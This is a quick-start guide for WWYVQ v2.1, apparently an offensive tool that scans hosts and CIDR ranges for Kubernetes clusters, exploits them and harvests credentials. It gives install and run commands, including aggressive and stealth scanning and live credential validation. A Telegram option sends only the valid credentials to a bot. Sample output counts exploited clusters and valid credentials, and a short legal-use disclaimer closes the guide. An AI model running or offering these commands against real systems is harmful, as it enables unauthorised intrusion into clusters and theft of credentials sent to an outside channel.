# WWYVQ v2.1 - Quick Start Guide

## 🚀 Installation & Setup

### Prerequisites
- Python 3.8+ (recommended: Python 3.12)
- Basic networking knowledge
- Target authorization (only scan authorized systems)

### Required Dependencies
```bash
# Install core dependencies
pip install aiohttp pyyaml

# Optional dependencies for enhanced features
pip install rich questionary  # For enhanced CLI
```

### Quick Setup
```bash
# 1. Clone the repository
git clone https://github.com/wKayaa/wwyvq4_finalv1.git
cd wwyvq4_finalv1

# 2. Generate configuration file
python3 wwyvq_v21.py --generate-config

# 3. Edit configuration (optional)
nano wwyvq_sample_config.yaml

# 4. Run basic test
python3 wwyvq_v21.py -t httpbin.org --k8s-focus --timeout 10
```

## 🎯 Quick Examples

### 1. Basic Kubernetes Scan
```bash
python3 wwyvq_v21.py -t 192.168.1.100 --k8s-focus
```

### 2. CIDR Range Scan
```bash
python3 wwyvq_v21.py --cidr 10.0.0.0/24 -m aggressive --threads 20
```

### 3. File-based Targets
```bash
# Create targets file
echo -e "192.168.1.100\n192.168.1.101\nhttpbin.org" > targets.txt

# Scan with validation
python3 wwyvq_v21.py -f targets.txt --validate --export --json
```

### 4. Stealth Mode with Notifications
```bash
python3 wwyvq_v21.py -t target.com -m stealth \
  --telegram-token "YOUR_BOT_TOKEN" \
  --telegram-chat "YOUR_CHAT_ID" \
  --notify --valid-only
```

## ⚙️ Configuration

### Basic Configuration
```yaml
# Edit wwyvq_sample_config.yaml
exploit:
  kubernetes_focus: true
  max_concurrent_clusters: 50
  timeout_per_operation: 30

validator:
  enabled: true
  confidence_threshold: 75.0

notifier:
  telegram_enabled: true  # Enable notifications
  telegram_token: "YOUR_BOT_TOKEN"
  telegram_chat_id: "YOUR_CHAT_ID"
```

### Telegram Setup (Optional)
1. Create bot with @BotFather
2. Get bot token
3. Get your chat ID
4. Update configuration file

## 🎮 Command Reference

### Target Specification
```bash
-t host1,host2,host3          # Multiple targets
-f targets.txt                # From file
--cidr 192.168.1.0/24        # CIDR range
```

### Execution Modes
```bash
-m passive     # Passive reconnaissance only
-m active      # Standard active scanning (default)
-m aggressive  # High-speed aggressive scanning
-m stealth     # Low-profile stealth scanning
```

### Features
```bash
--k8s-focus      # Focus on Kubernetes (recommended)
--validate       # Enable real-time credential validation
--notify         # Enable notifications
--export         # Enable data export
--json           # Export JSON format
--hosts-file     # Generate hosts file
```

### Performance
```bash
--threads 100    # Concurrent threads (default: 50)
--timeout 15     # Operation timeout (default: 30)
--rate-limit 0.1 # Rate limiting delay (default: 0.1)
```

## 📊 Understanding Results

### Console Output
```
🎯 EXPLOITATION RESULTS:
   • Targets Processed: 10
   • Clusters Found: 2
   • Clusters Exploited: 1
   • Credentials Found: 5
   • Vulnerabilities Found: 3

🔍 VALIDATION RESULTS:
   • Credentials Validated: 5
   • Valid Credentials: 2
   • Invalid Credentials: 3
```

### Export Files
- `results/` - Main results directory
- `*.json` - Detailed JSON results with metadata
- `hosts_*.txt` - Generated hosts file for further testing

## 🔧 Troubleshooting

### Common Issues

#### "No module named 'aiohttp'"
```bash
pip install aiohttp
```

#### "No targets specified"
```bash
# Always specify targets
python3 wwyvq_v21.py -t example.com
```

#### "Failed to initialize engine"
```bash
# Check Python version (requires 3.8+)
python3 --version

# Check dependencies
pip install -r requirements_ultimate.txt
```

### Debug Mode
```bash
# Enable debug output
python3 wwyvq_v21.py -t target.com --debug -vv
```

## ⚠️ Legal & Ethical Use

### Important Notices
- **Only scan authorized systems**
- **Respect rate limits and terms of service**
- **Use for legitimate security testing only**
- **Follow responsible disclosure practices**

### Recommended Usage
1. **Internal networks** with proper authorization
2. **Bug bounty programs** with explicit scope
3. **Penetration testing** with signed agreements
4. **Red team exercises** with organizational approval

## 🆘 Support

### Getting Help
1. Check this documentation
2. Review error messages in debug mode
3. Check GitHub issues
4. Ensure proper authorization for targets

### Reporting Issues
- Include WWYVQ version (`--version`)
- Provide command used (sanitize sensitive data)
- Include error output in debug mode
- Specify operating system and Python version

---

**Status**: Production Ready 🚀  
**Version**: 2.1  
**Author**: wKayaa